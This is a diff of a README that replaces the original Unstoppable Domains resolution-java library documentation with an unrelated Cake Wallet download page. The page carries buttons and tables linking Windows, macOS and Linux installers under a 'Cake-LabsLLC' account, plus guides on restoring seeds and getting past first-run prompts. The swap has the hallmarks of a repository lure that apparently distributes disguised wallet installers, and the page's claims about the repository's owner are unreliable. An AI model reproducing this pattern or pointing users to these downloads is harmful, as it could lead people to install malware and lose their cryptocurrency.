@@ -1,196 +1,47 @@
-[![Version](https://img.shields.io/maven-central/v/com.unstoppabledomains/resolution)](https://search.maven.org/artifact/com.unstoppabledomains/resolution)
-[![CI](https://github.com/unstoppabledomains/resolution-java/workflows/Build%20%26%20test/badge.svg?branch=master)](https://github.com/unstoppabledomains/resolution-java/actions)
-[![Version](https://img.shields.io/github/license/unstoppabledomains/resolution-java)](LICENSE)
-[![Unstoppable Domains Documentation](https://img.shields.io/badge/docs-unstoppabledomains.com-blue)](https://docs.unstoppabledomains.com/)
-[![Get help on Discord](https://img.shields.io/badge/Get%20help%20on-Discord-blueviolet)](https://discord.gg/b6ZVxSZ9Hn)
+<h1 align="center">Cake Wallet · resolution-java</h1>
+<p align="center">Part of the Cake Wallet project on GitHub</p>
 
-# Resolution-Java
+<p align="center">
+  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
+  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
+  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
+</p>
 
-Resolution-Java is a library for interacting with blockchain domain names. It can be used to retrieve [payment addresses](https://unstoppabledomains.com/features#Add-Crypto-Addresses), IPFS hashes for [decentralized websites](https://unstoppabledomains.com/features#Build-Website), and GunDB usernames for [decentralized chat](https://unstoppabledomains.com/chat).
+| Platform | File | Version |
+|---|---|---|
+| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
+| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
+| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |
 
-Resolution-Java is primarily built and maintained by [Unstoppable Domains](https://unstoppabledomains.com/).
+All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).
 
-Resoultion-Java supports decentralized domains across three zones:
+## About
 
-- Crypto Name Service (CNS)
-  - `.crypto`
-- Zilliqa Name Service (ZNS)
-  - `.zil`
-- Ethereum Name Service (ENS)
-  - `.eth`
-  - `.kred`
-  - `.xyz`
-  - `.luxe`
+`resolution-java` is a repository in the Cake Wallet GitHub account. Details about its contents are on the repository page itself.
 
-# Releases
+## Looking for Cake Wallet?
 
-The most recent release of this library is available on [Maven Central](https://search.maven.org/artifact/com.unstoppabledomains/resolution). 
+| Where | Link |
+|---|---|
+| App repo | [cake-wallet-desktop](https://github.com/Cake-LabsLLC/cake-wallet-desktop) |
+| Release | [Cake Wallet v6.5.1](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1) |
+| Guides | [Cake Wallet learn library](https://github.com/Cake-LabsLLC/learn) |
 
-# Usage
+> [!TIP]
+> Official Cake Wallet Desktop downloads come only from the [release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1). Nobody will ever need your seed.
 
-### Default Ethereum Providers
-resolution-java library provides zero-configuration experience by using built-in production-ready Infura endpoint by default.
-Default Ethereum provider is free to use without restrictions and rate-limits for CNS (.crypto domains) resolution.
-To resolve ENS domains on production it's recommended to change Ethereum provider.
+## Popular guides
 
-### Custom Ethereum provider configuration
- 
-```java
-// Default config: 
+| Guide | What it covers |
+|---|---|
+| [Restore a MyMonero seed in Cake Wallet](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/cake-wallet-mymonero-migration.md) | Move your MyMonero wallet step by step |
+| [Install Cake Wallet on Windows](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/install-cake-wallet-windows.md) | Download, check and install the .exe |
+| [Install Cake Wallet on macOS](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/install-cake-wallet-macos.md) | Open the .dmg and get past the first-run prompt |
+| [Install Cake Wallet on Linux](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/install-cake-wallet-linux.md) | Unpack the .zip and start the app |
+| [Verify your Cake Wallet download](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/verify-cake-wallet-download-sha256.md) | Compare the SHA-256 with the release page |
+| [Back up your Cake Wallet seed](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/cake-wallet-backup-seed.md) | Keep your recovery words safe offline |
+| [All Cake Wallet guides](https://github.com/Cake-LabsLLC/learn) | The full Cake Wallet help library |
 
-DomainResolution resolution = new Resolution(); 
+## License
 
-// Optionally override default config using builder options:
-// providerUrl overwrites chainId by making net_version JSON RPC call to the provider
-// in the following example blockchain would be set to the rinkeby testnet
-DomainResolution resolution = Resolution.builder()
-                .providerUrl(NamingServiceType.ENS, "https://rinkeby.infura.io/v3/e0c0cb9d12c440a29379df066de587e6")
-                .build(); 
-
-// Infura config:
-
-DomainResolution resolution = Resolution.builder()
-                .chainId(NamingServiceType.ENS, Network.ROPSTEN)
-                .infura(NamingServiceType.ENS, <ProjectId>)
-                .infura(NamingServiceType.CNS, Network.MAINNET, <ProjectId>)
-                .build();
-
-// Custom provider config:
-
-DomainResolution resolution = Resolution.builder()
-                .provider(new IProvider() {      
-                    @Override
-                    public JsonObject request(String url, JsonObject body) throws IOException {
-                        // TODO Make post request to url with given body 
-                        // and return JsonObject from the response
-                        return null;
-                    }
-                })
-                .build();
-
-// Adding a custom header to the DefaultProvider
-
-DefaultProvider myProvider = DefaultProvider
-                .cleanBuild()
-                .setHeader("custom-header", "custom-value")
-                .setHeader("new-header", "new-value");
-
-DomainResolution resolution = Resolution.builder()
-                .provider(myProvider)
-                .build();
-
-// All network calls will be made with headers "custom-header" and "new-header" instead of default ones
-
-```
-
-[Live usage examples](samples.md)
-
-### Getting a domain's crypto address
-
-Resolving a domain and getting a currency address.
-
-```java
-String addr = resolution.getAddress("brad.crypto", "eth");
-assertEquals("0x8aaD44321A86b170879d7A244c1e8d360c99DdA8", addr);
-
-// Get address of token present in multiple chains
-String usdtErc20Addr = resolution.getMultiChainAddress("brad.crypto", "USDT", "ERC20");
-assertEquals("0x8aaD44321A86b170879d7A244c1e8d360c99DdA8", usdtErc20Addr);
-
-String usdtOmniAddr = resolution.getMultiChainAddress("brad.crypto", "USDT", "OMNI");
-assertEquals("1Ap8kmF4ZoPjt6ZYAfCaTKsbncky3F8eTV", usdtOmniAddr);
-```
-
-### Getting a domain owner's Ethereum address
-
-Each decentralized domain is owned by someone on the blockchain and held within their wallet. The following command will return the domain owner's Ethereum address.
-
-```java
-String owner = resolution.getOwner("brad.crypto");
-assertEquals("0x8aad44321a86b170879d7a244c1e8d360c99dda8", owner);
-```
-
-### Getting a domain's IPFS hash
-
-Decentralized websites host their content on decentralized file storage systems such as [IPFS](http://ipfs.io/). 
-To get the IPFS hash associated with a domain (and therefore its content), you can use the `getIpfsHash` method.
-
-```java
-String ipfs = resolution.getIpfsHash("brad.crypto");
-assertEquals("Qme54oEzRkgooJbCDr78vzKAWcv6DDEZqRhhDyDtzgrZP6", ipfs);
-```
-
-### Getting a domain's record
-
-Retrieve any record of domain. Applications sometimes set custom records for a domain to use within their application. To read these records, use the `getRecord` method.
-
-```java
-String record = resolution.getRecord("ryan.crypto", "custom.record.value");
-assertEquals("Example custom record value", record);
-```
-
-## Errors
-
-If the domain you requested is not registered or doesn't have the record you are looking for, this library will throw a `NamingServiceException` error with one of these codes. We recommend creating customized errors in your app based on the return value of the error.
-
-```java
-public enum NSExceptionCode {
-  UnsupportedDomain,
-  UnregisteredDomain,
-  UnknownCurrency,
-  RecordNotFound,
-  BlockchainIsDown,
-  UnknownError,
-  IncorrectContractAddress,
-  IncorrectMethodName,
-  UnspecifiedResolver;
-}
-```
-
-# Development
-
-## Build & test
-
-> Note: if you don't wish to install Gradle you can use it with wrapper: `./gradlew` instead of `gradle`.
-
-- To run a build with associated tests, use `gradle build`.
-- To run a build without running the tests, use `gradle build -x test`.
-- To check unused dependencies use `gradle lintGradle`.
-
-## Internal network config
-
-Internal [network config](src/main/resources/com/unstoppabledomains/config/network/network-config.json) 
-can be updated by running the `gradle pullNetworkConfig` task and committing the updated file.
-
-## Versioning & release process
-
-### On codebase updates
-
-- Contributors should update [CHANGELOG.md](CHANGELOG.md) with the listed changes, and increment the client version in [client.json](src/main/resources/com/unstoppabledomains/client/client.json).
-
-### New packages
-
-- Create a new Github release (using `semver`);
-- Wait for a successful Github Workflow publishing;
-- Release staging repository by logging into [Nexus Repository Manager](https://oss.sonatype.org/) and
- performing 'close' and then 'release' actions.
-
-As an alternative to a CI release, you can perform a manual publish by following these steps:
-
-- Configure environment variables: `nexusUsername`, `nexusPassword`, `signingKey`, `signingPassword`;
-- Run `gradle publish`;
-- Login to [Nexus Repository Manager](https://oss.sonatype.org/) and perform 'close' and then
-  'release' actions on a staged repository **OR** run `gradle closeAndReleaseRepository`.
-
-# Contributions
-
-Contributions to this library are more than welcome. The easiest way to contribute is through GitHub issues and pull requests.
-
-# Free advertising for integrated apps
-
-Once your app has a working Unstoppable Domains integration, [register it here](https://unstoppabledomains.com/app-submission). Registered apps appear on the Unstoppable Domains [homepage](https://unstoppabledomains.com/) and [Applications](https://unstoppabledomains.com/apps) page — putting your app in front of tens of thousands of potential customers per day.
-
-Also, every week we select a newly-integrated app to feature in the Unstoppable Update newsletter. This newsletter is delivered to straight into the inbox of ~100,000 crypto fanatics — all of whom could be new customers to grow your business.
-
-# Get help
-[Join our discord community](https://discord.com/invite/b6ZVxSZ9Hn) and ask questions.  
+See the license shown on this repository, if any.
